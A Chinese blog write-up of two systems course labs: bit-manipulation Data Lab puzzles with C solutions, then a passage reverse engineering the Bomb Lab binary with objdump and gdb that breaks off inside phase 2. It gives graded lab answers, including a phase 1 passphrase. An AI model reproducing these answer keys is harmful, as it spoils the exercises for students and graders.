<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~(x+<span class="number">1</span>)^x))&amp;!!(x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑四位的最大值<code>x=0111</code>
，x+1之后就会变成<code>1000</code> ，对<code>1000</code> 取非
<code>0111</code>
就会重新变回x值，自己与自己异或会得到0，所以可以用异或来判断<code>~(x+1)</code>与<code>x</code>是否相等，从而判断是否为x最大值。</p>
<blockquote>
<p>小技巧：等号的操作可以直接利用<code>a == b</code> 等价于
<code>!(a ^b)</code></p>
</blockquote>
<p>这里有一个例外就是<code>x=-1</code> ，由于<code>-1=1111</code>
他利用上面的式子判断也符合，故要特判-1 利用<code>!!(x+1)</code>
这个操作-1和最大值并不相同。</p>
<h3 id="alloddbits">4. allOddBits</h3>
<p>判断所有奇数位是否都为1，这里的奇数指的是位的阶级是2的几次幂。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  mask = mask + (mask &lt;&lt; <span class="number">16</span>); <span class="comment">// 迭代两次得到奇数位全1的掩码</span></span><br><span class="line">  <span class="keyword">return</span> !((mask &amp; x) ^ mask); <span class="comment">// 即判断 mask&amp;x == mask</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先要构造掩码，使用移位运算符构造出奇数位全1的数 <code>mask</code>
，然后获取输入 <code>x</code>
值的奇数位，其他位清零（<code>mask&amp;x</code>），然后与
<code>mask</code>
进行异或操作，若相同则最终结果为0，然后返回其值的逻辑非。</p>
<h3 id="negate">5. negate</h3>
<p>不使用 <code>-</code> 操作符，求 <code>-x</code> 值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 补码等于反码加1</span></span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>补码实际上是一个阿贝尔群，满足性质公式：<code>A + ~A = -1</code>和<code>A + neg A =0</code>，利用这两个式子我们可以得到
<code>neg A = ~A + 1</code>，对于 <code>x</code>，<code>-x</code>
是其补码，所以 <code>-x</code> 可以通过对 <code>x</code>
取反加1得到。</p>
<h3 id="isasciidigit">6. isAsciiDigit</h3>
<p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值，即计算
<code>x</code> 是否在 0x30 ~ 0x39 范围内。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xf0</span>) ^ <span class="number">0x30</span>) &amp; !(((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>) &amp; !(x &amp; (~<span class="number">0xff</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别对低位和高位字节进行判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断 低位第2字节 是否等于0x30 是则返回0</span></span><br><span class="line"><span class="type">int</span> res2 = (x &amp; <span class="number">0xf0</span>)^<span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断 低位第1字节 在+6以后是否不进位 不进位说明在0~9之间 是则返回0</span></span><br><span class="line"><span class="type">int</span> res1 = ((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断其他高位字节 是否等于0 是则返回0</span></span><br><span class="line"><span class="type">int</span> res3 = x &amp; (~<span class="number">0xff</span>);s</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后综合在一起</span></span><br><span class="line"><span class="keyword">return</span> !res1 &amp; !res2 &amp; !res3;</span><br></pre></td></tr></table></figure>
<h3 id="conditional">7. conditional</h3>
<p>实现类似<code>x?y:z</code>的条件计算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = (!x)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> (y | ~mask) &amp; (z | mask) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>x?y:z</code>表示当x为0时返回y，当x不为0时返回z；</p>
<p>（1）先使用<code>！</code>对<code>x</code>进行判断，得到布尔值0或1，再减1可分别得到<code>0xffffffff</code>和<code>0x0</code></p>
<p>（2）构造<code>y | ~mask</code>，此时当mask=<code>0xffffffff</code>时取y，当mask=<code>0x0</code>时取<code>0xffffffff</code>;对称构造<code>z | mask</code>,此时当mask=<code>0xffffffff</code>时取<code>0xffffffff</code>，当mask=<code>0x0</code>时取z;用<code>&amp;</code>连接即可满足条件。</p>
<h3 id="islessorequal">8. isLessOrEqual</h3>
<p>实现小于等于比较。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取x和y的符号值 默认是算术右移 负数----1111 正数-----0000</span></span><br><span class="line">  <span class="type">int</span> sx = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> sy = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 判断符号是否相同  相同----0000 不同-----1111</span></span><br><span class="line">  <span class="type">int</span> mask = sx ^ sy;</span><br><span class="line">  <span class="comment">// 在符号相同时 判断y-x值的符号 y&lt;x---0000---0 y&gt;=x---1111---1</span></span><br><span class="line">  <span class="type">int</span> sm = (y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 符号不同时 判断sx sx=1111---x&lt;y---1  sx=0000----x&gt;y---0</span></span><br><span class="line">  <span class="keyword">return</span> !!((mask &amp; sx) | (~mask &amp; ~sm));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="logicalneg">9. logicalNeg</h3>
<p>实现逻辑非运算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ~((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0与其他整数的区别是，0的负数仍然为0，而其他整数求负数后符号改变。这里要考虑一个特例，当x为最小值<code>0x80000000</code>时，x的负数仍然为最小值，最高位虽然不变但是仍为1。综上，除0以外，x和其负数的最高位中必有一个是1。</p>
<p>int类型中负数用补码表示，求补码即反码加一，构造<code>(x | (~x + 1))</code>操作，只有<code>x=0</code>时最高位保持
0，利用这一点，求反后右移保留最高位，检测该位是否为 1
就可以实现逻辑非。</p>
<h3 id="howmanybits">10. howManyBits</h3>
<p>计算最少需要多少位可以用补码表示法来表示数<code>x</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是正数，寻找最高位1出现的位置，然后加上一位符号位即可。如果是负数的话，只需要知道最高位
0
出现的位置，再添加一个符号位。所以负数可以先对其取反，然后按照正数操作。</p>
<p>寻找过程为 2
分法，利用<code>!!(x &gt;&gt; bits)</code>来判断该段是否有
1。有则左移至该段，否则不移动即另一端。注意最后 2
位的情况，<code>11</code>和<code>10</code>都会使<code>ans1 = 1</code>且<code>ans0 = 1</code>，事实上只有全
0（数
0）的情况会使<code>ans0 = 0</code>。最后注意需要加上一个符号位，最终答案把移位结果累加<code>ans16 + ans8 + ans4 + ans2 + ans1 + ans0 + 1</code>。</p>
<h3 id="floatscale2">11. floatScale2</h3>
<p>实现浮点数乘 2。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分别计算 指数位 符号位 有效位</span></span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="comment">// 分三种情况讨论</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// NaN</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// mult 2</span></span><br><span class="line">    <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | sign;</span><br><span class="line">  <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// overflow Nan</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | sign | frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IEEE标准32位浮点数格式为：最高位 1
位为<strong>符号位</strong>（sign），8
为为<strong>指数位</strong>（exp），剩下的 23
位为<strong>有效位</strong>（frac）。</p>
<p>根据浮点数范围，浮点数乘2需要分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN ，无穷大，乘2仍然返回原参数；</li>
<li><code>exp == 0x00</code>：非规格数，这时候 frac 无起始 1，乘2即将
frac 部分左移 1
位，同时还需要考虑符号，整体运算等价于<code>(uf &lt;&lt; 1) | sign</code></li>
<li><code>exp == others</code>：
规格化情况，先增加指数位，注意这时候判断是否为 0xff
达到无穷大。按位模式组合成新的浮点数输出即可<code>(exp &lt;&lt; 23) | sign | frac</code>。</li>
</ul>
<h3 id="floatfloat2int">12. floatFloat2Int</h3>
<p>将单精度浮点数转化为int类型整数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)             <span class="comment">// NaN or infinity</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// 非规格化数字都是小于1的数 直接返回0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">// 规格化数字</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> frac1 = <span class="number">0x800000</span> | frac; <span class="comment">// 补充小数部分隐含的1</span></span><br><span class="line">    <span class="type">int</span> exp1 = <span class="built_in">exp</span> - <span class="number">127</span>;        <span class="comment">// 减去偏移值得到真实的移码</span></span><br><span class="line">    <span class="comment">// 超过范围的直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">31</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exp1 &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">    <span class="comment">// 在int表示范围内 判断移位方向</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">23</span>)</span><br><span class="line">      frac1 = frac1 &lt;&lt; (exp1 - <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      frac1 = frac1 &gt;&gt; (<span class="number">23</span> - exp1);</span><br><span class="line">    <span class="comment">// 根据符号分别返回</span></span><br><span class="line">    <span class="keyword">if</span> (sign) </span><br><span class="line">      <span class="keyword">return</span> ~frac1 + <span class="number">1</span>; <span class="comment">// 负数则返回其补码</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> frac1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN
或无穷大，直接返回最大值<code>0x80000000</code>；</li>
<li><code>exp == 0x00</code>：非规格化数字，都是小于1的数，直接返回0；</li>
<li><code>exp == others</code>：
规格化情况，先补充隐含的1，frac变为24位，减去偏移值得到真实的移码exp1。
<ul>
<li>exp1大于31或者小于0都超过int表示范围，直接返回0。</li>
<li>frac相当于已经左移了23位，需要再判断exp1与23的大小，大于23则还需要左移（exp1-23）位，小于则需要右移（23-exp1）位。</li>
<li>最后根据uf的符号分别返回，正数直接返回移位后的数，负数则返回其补码。</li>
</ul></li>
</ul>
<h3 id="floatpower2">13. floatPower2</h3>
<p>计算2.0的x次方。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实验结果">实验结果</h2>
<p><img src="/post/ba783922/image-20221014201052512.png" alt="image-20221014201052512" style="zoom: 67%;"></p>
<h2 id="补充">补充</h2>
<ul>
<li><p>编译时一直有个警告：</p>
<p><img src="/post/ba783922/image-20221014200543586.png"></p>
<p>在"btest.c"文件中对arg_test_range[1]初始化即可解决。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Sanity check on the number of args */</span></span><br><span class="line"><span class="keyword">if</span> (args &lt; <span class="number">0</span> || args &gt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Configuration error: invalid number of args (%d) for function 	%s\n&quot;</span>, args, t-&gt;name);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;	</span><br><span class="line">arg_test_range[<span class="number">1</span>] = <span class="number">0</span>; <span class="comment">//添加</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Assign range of argument test vals so as to conserve the total</span></span><br><span class="line"><span class="comment">   number of tests, independent of the number of arguments */</span></span><br><span class="line"><span class="keyword">if</span> (args == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = TEST_RANGE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (args == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = <span class="built_in">pow</span>((<span class="type">double</span>)TEST_RANGE, <span class="number">0.5</span>); <span class="comment">/* sqrt */</span></span><br><span class="line">	arg_test_range[<span class="number">1</span>] = arg_test_range[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>测试时最后一题一直显示超时，将makefile里的m32改位m64，就可以了。</p></li>
</ul>
<h1 id="实验2二进制炸弹bomb-lab">实验2：二进制炸弹（Bomb Lab）</h1>
<h2 id="实验介绍-1">实验介绍</h2>
<p>二进制炸弹是一个包含一系列阶段的可执行程序，每个阶段需要你在<code>stdin</code>上输入一个特定的字符串。如果你输入的字符串正确，那么这个阶段就被成功拆除，炸弹进入下一阶段。否则，炸弹会爆炸，并输出"BOOM!!!",然后终止。当所有的阶段都被成功拆除后炸弹就被拆除。</p>
<h2 id="实验要求-1">实验要求</h2>
<blockquote>
<p>根据“学号后三位%47”领取自己的代码包</p>
</blockquote>
<h2 id="实验思路-1">实验思路</h2>
<p>准备工作: 得到汇编代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt;&gt; bomb.s</span><br></pre></td></tr></table></figure>
<h3 id="phase-1">Phase 1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048b80 &lt;phase_1&gt;:</span><br><span class="line"> 8048b80:	55                   	push   %ebp</span><br><span class="line"> 8048b81:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048b83:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048b86:	c7 44 24 04 b8 99 04 	movl   $0x80499b8,0x4(%esp)</span><br><span class="line"> 8048b8d:	08 </span><br><span class="line"> 8048b8e:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048b91:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048b94:	e8 66 05 00 00       	call   80490ff &lt;strings_not_equal&gt; </span><br><span class="line"> 8048b99:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048b9b:	74 05                	je     8048ba2 &lt;phase_1+0x22&gt;</span><br><span class="line"> 8048b9d:	e8 24 0b 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048ba2:	c9                   	leave  </span><br><span class="line"> 8048ba3:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>这段程序调用了两个函数，根据名字可以猜测函数的作用。<code>strings_not_equal</code>函数，是比较两个字符串是否相等，然后测试函数的返回值，如果不为0则调用<code>explode_bomb</code>程序引爆炸弹。所以问题是怎么找到对比的字符串。可以看到，在第5行，调用<code>strings_not_equal</code>函数前程序为其分配了一个地址空间<code>0x80499b8</code>，猜测该地址可能为函数<code>strings_not_equal</code>的参数地址，也就是有可能是比对字符串的起始地址。打印地址内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x80499b8</span><br><span class="line">0x80499b8:      &quot;The future will be better tomorrow.&quot;</span><br></pre></td></tr></table></figure>
<p>即可得到第一个炸弹的答案:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The future will be better tomorrow.</span><br></pre></td></tr></table></figure>
<h3 id="phase-2">Phase 2</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048ba4 &lt;phase_2&gt;:</span><br><span class="line"> 8048ba4:	55                   	push   %ebp</span><br><span class="line"> 8048ba5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba7:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048baa:	8d 45 e4             	lea    -0x1c(%ebp),%eax</span><br><span class="line"> 8048bad:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 8048bb1:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048bb4:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048bb7:	e8 b0 04 00 00       	call   804906c &lt;read_six_numbers&gt; # 读6个数字</span><br><span class="line"> 8048bbc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) # i=1</span><br><span class="line"> 8048bc3:	eb 1e                	jmp    8048be3 &lt;phase_2+0x3f&gt;</span><br><span class="line"> 8048bc5:	8b 45 fc             	mov    -0x4(%ebp),%eax  # a=i</span><br><span class="line"> 8048bc8:	8b 54 85 e4          	mov    -0x1c(%ebp,%eax,4),%edx # d=M[base+4*i-28] A[i-7]</span><br><span 